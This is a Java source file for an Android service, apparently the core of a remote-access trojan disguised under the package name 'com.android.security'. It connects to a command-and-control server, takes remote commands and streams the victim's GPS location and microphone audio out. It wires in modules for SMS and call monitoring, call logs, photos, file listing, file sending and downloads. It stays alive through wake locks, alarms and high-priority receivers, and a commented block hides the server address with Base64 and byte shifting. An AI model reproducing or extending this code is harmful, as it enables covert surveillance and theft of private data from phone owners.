package com.android.security;
 
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.lang.ref.WeakReference;
import java.util.ArrayList;
import java.util.concurrent.locks.ReentrantLock;

import com.android.security.inout.Controler;
import com.android.security.inout.Protocol;
import com.android.security.library.AdvancedSystemInfo;
import com.android.security.library.AudioStreamer;
import com.android.security.library.CallLogLister;
import com.android.security.library.CallMonitor;
import com.android.security.library.DirLister;
import com.android.security.library.FileSender;
import com.android.security.library.GPSListener;
import com.android.security.library.PhotoTaker;
import com.android.security.library.SMSMonitor;
import com.android.security.library.SystemInfo;
import com.android.security.library.UrlDownloader;
import com.android.security.out.Connection;
import com.android.security.packages.TransportPacket;
import com.android.security.receiver.AlarmReceiver;
import com.android.security.receiver.HomeKeyEventReceiver;
import com.android.security.receiver.NetworkEventReceiver;
import com.android.security.utils.Config;
import com.android.security.packages.CommandPacket;
import com.android.security.packages.LogPacket;
import com.android.security.packages.PreferencePacket;

import android.annotation.SuppressLint;
import android.app.Service;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.res.AssetManager;
import android.location.Location;
import android.location.LocationListener;
import android.media.AudioRecord;
import android.media.AudioRecord.OnRecordPositionUpdateListener;
import android.net.wifi.WifiManager;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.IBinder;
import android.os.Message;
import android.os.PowerManager;
import android.os.StrictMode;
import android.util.Log;
import android.widget.Toast;
 

public class MainService extends Service implements Controler,OnRecordPositionUpdateListener, LocationListener{

	private String TAG = this.getClass().getSimpleName();
	private Connection connect = null;
	private HomeKeyEventReceiver homekeyReceiver;
	private String host = null;
	private boolean isServiceRunning = false;
	private boolean isShuttingdown = false;
	private boolean isVerified = false;
	private byte[] keepAliveDate;
	private Handler keepAliveHandler;
	private Runnable keepAliveRunnable;
	private ReentrantLock lock;
	private PowerManager.WakeLock mWakeLock;
	private WifiManager.WifiLock mWifiLock;
	private NetworkEventReceiver networkReceiver;
	private MyHandler myHandler;
	private String password = null;
	private int port = 0;
	private ProcessCommand processCMD;
	private boolean stopReceive;
	
	
	public SMSMonitor smsMonitor;
	public AudioStreamer audioStreamer;
	public CallMonitor callMonitor;
	public CallLogLister callLogLister;
	public DirLister dirLister ;
	public GPSListener gps;
	public PhotoTaker photoTaker ;
	public SystemInfo infos;
	public Toast toast ;
	public AdvancedSystemInfo advancedInfos;
	public UrlDownloader urlDownloader;
	public FileSender fileSender;
	
	boolean waitTrigger;
	ArrayList<String> authorizedNumbersCall;
	ArrayList<String> authorizedNumbersSMS;
	ArrayList<String> authorizedNumbersKeywords;

	private void checkAndConnectToServer() {
 

		if (!isServiceRunning) {
			isServiceRunning = true;
			if (isNetworkConnected()) {
				connectToServer();
				return;
			}
			disconnect();
			return;
		}
		if (connect == null) {
			if (isNetworkConnected()) {
				connectToServer();
				return;
			}
			disconnect();
			return;
		}
		if (!connect.isConnected()) {
			if (isNetworkConnected()) {
				connectToServer();
				return;
			}
			disconnect();
			return;
		}
		if (!isVerified) {
			sendVerify();
		}
	}

	private void connectThread() {
		if (this.lock.tryLock())
			try {
				checkAndConnectToServer();
				return;
			} finally {
				if ((this.lock.isLocked())
						&& (this.lock.isHeldByCurrentThread()))
					this.lock.unlock();
			}
		Log.v(TAG, "忽略此次服务启动请求");
	}

	private void connectToServer() {

		try {
			if (connect != null) {
				connect.disconnect();
				connect = null;
			}
			connect = new Connection(host, port, this);
			connect.connect();
		} catch (Exception e) {
			e.printStackTrace();
		}
		if ((connect != null) && (connect.isConnected())) {
			stopReceive = false;
			new Thread(new Runnable() {
				public void run() {
					MainService.this.waitData();
				}
			}).start();
			sendVerify();
			return;
		}
		disconnect();
	}

	private void keepServiceAlive() {
		if (this.isShuttingdown) {
			this.isShuttingdown = false;
			disconnect();
			stopSelf();
			return;
		}
		AlarmReceiver.setAlarm(this, 20, 1);
	}

	private void lockPower() {
		try {
			if ((this.mWakeLock == null) || (!this.mWakeLock.isHeld())) {
				this.mWakeLock = ((PowerManager) getSystemService(POWER_SERVICE))
						.newWakeLock(1, MainService.class.getName());
				this.mWakeLock.setReferenceCounted(true);
				this.mWakeLock.acquire();
			}
			if ((this.mWifiLock == null) || (!this.mWifiLock.isHeld())) {
				this.mWifiLock = ((WifiManager) getSystemService(WIFI_SERVICE))
						.createWifiLock(MainService.class.getName());
				this.mWifiLock.setReferenceCounted(true);
				this.mWifiLock.acquire();
			}
			return;
		} catch (Exception localException) {
		}
	}

	private void sendKeepAlive() {
		if (this.keepAliveDate == null)
			this.keepAliveDate = new CommandPacket(Protocol.KEEP_ALIVE, 0,new byte[0]).build();
		sendData(2, this.keepAliveDate);
	}

	private void sendVerify() {
		sendData(0, new CommandPacket(Protocol.GET_PASSWORD, 0, new byte[0])
						.build());
	}
	// processCMD.process(paramBundle.getShort("command"),paramBundle.getByteArray("arguments"),paramBundle.getInt("chan"));
	public void Storage(TransportPacket paramTransportPacket, String paramString) {
		try {
			CommandPacket localCommandPacket = new CommandPacket();
			localCommandPacket.parse(paramTransportPacket.getData());
			Message localMessage = new Message();
			Bundle localBundle = new Bundle();
			localBundle.putShort("command", localCommandPacket.getCommand());
			localBundle.putByteArray("arguments", localCommandPacket.getArguments());
			localBundle.putInt("chan", localCommandPacket.getTargetChannel());
			localMessage.setData(localBundle);
			this.myHandler.sendMessage(localMessage);
			return;
		} catch (Exception localException) {
			sendError("无法解析数据包: " + localException.getMessage());
		}
	}

	public boolean checkVerified(String paramString) {
		//paramString
		if (Config.password.equals(this.password)) {
			this.keepAliveHandler = new Handler();
			this.keepAliveRunnable = new Runnable() {
				public void run() {
					MainService.this.keepAlive();
				}
			};
			this.keepAliveHandler.postDelayed(this.keepAliveRunnable, 30000L);
			isVerified = true;
		} else {
			isVerified = false;
		}
		return this.isVerified;
	}

	public void disconnect() {
		this.isVerified = false;
		this.stopReceive = true;
		if ((this.keepAliveHandler != null) && (this.keepAliveRunnable != null))
			this.keepAliveHandler.removeCallbacks(this.keepAliveRunnable);
		this.keepAliveHandler = null;
		this.keepAliveRunnable = null;

		if (this.connect != null) {
			this.connect.disconnect();
			this.connect = null;
		}

		return;

	}

	public MyHandler getMyHandler() {
		return this.myHandler;
	}

	public boolean isNetworkConnected() {
		NetworkInfo localNetworkInfo = ((ConnectivityManager) getSystemService(CONNECTIVITY_SERVICE))
				.getActiveNetworkInfo();
		return (localNetworkInfo != null) && (localNetworkInfo.isAvailable());
	}

	protected void keepAlive() {
		if ((this.isVerified) && (!this.stopReceive)) {
			sendKeepAlive();
			this.keepAliveHandler.postDelayed(this.keepAliveRunnable, 15000L);
		}
	}

	public IBinder onBind(Intent paramIntent) {
		return null;
	}

	public void onCreate() {
/*		if (this.processCMD == null)
			this.processCMD = new ProcessCommand(this);
		if (this.myHandler == null)
			this.myHandler = new MyHandler(this);*/
		super.onCreate();
	}

	public void onDestroy() {
		Log.v(TAG, "Litchi Destroyed ..");
		if (this.homekeyReceiver != null) {
			unregisterReceiver(this.homekeyReceiver);
			this.homekeyReceiver = null;
		}
		if (this.networkReceiver != null) {
			unregisterReceiver(this.networkReceiver);
			this.networkReceiver = null;
		}
		if (this.mWakeLock != null) {
			this.mWakeLock.release();
			this.mWakeLock = null;
		}
		if (this.mWifiLock != null) {
			this.mWifiLock.release();
			this.mWifiLock = null;
		}
		disconnect();
		super.onDestroy();
	}

	@SuppressLint("NewApi")
	public int onStartCommand(Intent paramIntent, int paramInt1, int paramInt2) {

		if (paramIntent != null) {
			String who = paramIntent.getAction();
			//
			if (who!= null &&who.equals("shuttingdown")) {
				isShuttingdown = true;
			}
		} else {
			Log.v(TAG, "Litchi");
		}
		if (homekeyReceiver == null) {
			homekeyReceiver = new HomeKeyEventReceiver();
			IntentFilter intentFilter = new IntentFilter(
					"android.intent.action.CLOSE_SYSTEM_DIALOGS");
			intentFilter.setPriority(0x7fffffff);
			registerReceiver(homekeyReceiver, intentFilter);
		}
		lockPower();
		keepServiceAlive();
		if (readConfig()) {
			if (lock == null) {
				lock = new ReentrantLock();
			}
			if (networkReceiver == null) {
				networkReceiver = new NetworkEventReceiver();
				IntentFilter intentFilter = new IntentFilter(
						"android.net.conn.CONNECTIVITY_CHANGE");
				intentFilter.setPriority(0x7fffffff);
				registerReceiver(networkReceiver, intentFilter);
			}
			if (Build.VERSION.SDK_INT > 0x9) {
				StrictMode.ThreadPolicy policy = new StrictMode.ThreadPolicy.Builder()
						.permitAll().build();
				StrictMode.setThreadPolicy(policy);
			}
			new Thread(new Runnable() {
				public void run() {
					MainService.this.connectThread();
				}
			}).start();
		}

		return START_STICKY;
	}

	public void processCommand(Bundle paramBundle) {
		try {
			// processCMD.process(paramBundle.getShort("command"),paramBundle.getByteArray("arguments"),paramBundle.getInt("chan"));
			this.processCMD.process(paramBundle.getShort("command"),
					paramBundle.getByteArray("arguments"),
					paramBundle.getInt("chan"));
		} catch (Exception e) {
			sendError("执行命令时发生错误:" + e.getMessage());
		}
	}

	// ERROR //
	public boolean readConfig() {
		this.host = Config.ip;
		this.port = Config.port;
		this.password = Config.password;
	
	return true;
	/*
		AssetManager assetManager = getAssets();
		String[] files = null;
		try {
			files = assetManager.list("");
		} catch (IOException e) {
			Log.e(TAG, e.getMessage());
		}

		if (files == null || files.length == 0) {
			Log.e(TAG, "ERROR OPEN ASSET CONFIG FILE");
			return false;
		}
		InputStream inputStream = null;
		try {
			inputStream = assetManager.open(files[0]);
		} catch (IOException e) {
			Log.e(TAG, e.getMessage());
			return false;
		}
		String str = readTextFile(inputStream);
		byte[] t = new byte[str.length()];
		for (int i = 0; i < str.length(); i++) {
			t[i] = (byte) (str.charAt(i) + 1);
		}


		byte[] b = Base64.decode(t, Base64.DEFAULT);

		byte[] b2 = new byte[b.length];
		for (int j = 0; j < b.length; j++) {
			b2[j] = (byte) (b[j] + 1);
		}
		String str0 = new String(b2);
		//Log.w(TAG, str0);
		
		String url[] = str0.split(" ");
		if (url.length >= 2) {
			this.host = url[0];
			this.port = Integer.parseInt(url[1]);
		}
		if (url.length > 2)
			this.password = url[2];

		return true;*/
	}

	private String readTextFile(InputStream inputStream) {
		ByteArrayOutputStream outputStream = new ByteArrayOutputStream();
		byte buf[] = new byte[1024];
		int len;
		try {
			while ((len = inputStream.read(buf)) != -1) {
				outputStream.write(buf, 0, len);
			}
			outputStream.close();
			inputStream.close();
		} catch (IOException e) {
		}
		return outputStream.toString();
	}

	public void sendData(int paramInt, byte[] paramArrayOfByte) {
		try {
			connect.sendData(paramInt, paramArrayOfByte);
		} catch (NullPointerException e) {
			disconnect();
			return;
		} catch (Exception e) {
			disconnect();
		}
		return;
	}

	public void sendError(String paramString) {
		connect.sendData(1, new LogPacket(System.currentTimeMillis(), (byte) 1,
				paramString).build());
		return;
	}

	public void sendInformation(String paramString) {
 
	    connect.sendData(0x1, new LogPacket(System.currentTimeMillis(), (byte)0, paramString).build());
		return;
	}

	 
	public void toastText(String paramString) { }
	 
	public void waitInstruction() {
		try {
			for (;;) {
				if (stopReceive)
					break;
				connect.getInstruction();
			}
		} catch (Exception e) {
			disconnect();
		}
	}

	public void waitData() {
		try {
			while (true) {
				if (this.stopReceive)
					break;
				this.connect.getInstruction();
			}
		} catch (Exception localException) {
			disconnect();
		}
	}

	public static class MyHandler extends Handler {
		private final WeakReference<MainService> serviceRef;

		public MyHandler(MainService paramMainService) {
			this.serviceRef = new WeakReference(paramMainService);
		}

		public void handleMessage(Message paramMessage) {
			MainService localMainService = (MainService) this.serviceRef.get();
			if (localMainService != null)
				localMainService.processCommand(paramMessage.getData());
		}
	}
	public void onLocationChanged(Location location) {
		byte[] data = gps.encode(location);
		sendData(gps.getChannel(), data);
	}

	public void onProviderDisabled(String provider) {
		sendError("GPS desactivated");
	}

	public void onProviderEnabled(String provider) {
		sendInformation("GPS Activated");
	}

	public void onStatusChanged(String provider, int status, Bundle extras) {
		//We really don't care
	}
	
	
	public void onPeriodicNotification(AudioRecord recorder) {
		//Log.i("AudioStreamer", "Audio Data received !");
		try {
			byte[] data = audioStreamer.getData();
			if(data != null)
				sendData(audioStreamer.getChannel(), data);
		}
		catch(NullPointerException e) {
			
		}
	} 
 
	public void onMarkerReached(AudioRecord recorder) {
		sendError("Marker reached for audio streaming");
	}
	public void loadPreferences() {
		PreferencePacket p = processCMD.loadPreferences();
		waitTrigger = p.isWaitTrigger();
		//Config.ip = p.getIp();
		//Config.port = p.getPort();
		authorizedNumbersCall = p.getPhoneNumberCall();
		authorizedNumbersSMS = p.getPhoneNumberSMS();
		authorizedNumbersKeywords = p.getKeywordSMS();
	}
	
	public void setAirMode() {
		// TODO Auto-generated method stub
		Config.setAirplaneModeOn(getApplicationContext(), 1);
	}
}
